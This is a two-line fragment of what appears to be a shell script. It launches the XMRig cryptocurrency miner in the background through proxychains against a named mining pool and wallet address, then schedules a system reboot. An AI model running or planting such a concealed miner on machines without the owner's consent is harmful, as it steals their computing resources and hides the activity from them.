...
proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.minexmr.com:6666 -u 483NjkJRvjeNhTcd9Gqk3d7FmrsR5NTHm8wu2rvKpWyXQdUK3qAeXhiLA6kQZUk7KnMarQwmbRUkxSDPrBK3z2Ra1hoEEKL.b1 -p x -a cn/r -t 4 -k --tls -B
sudo shutdown -r +25
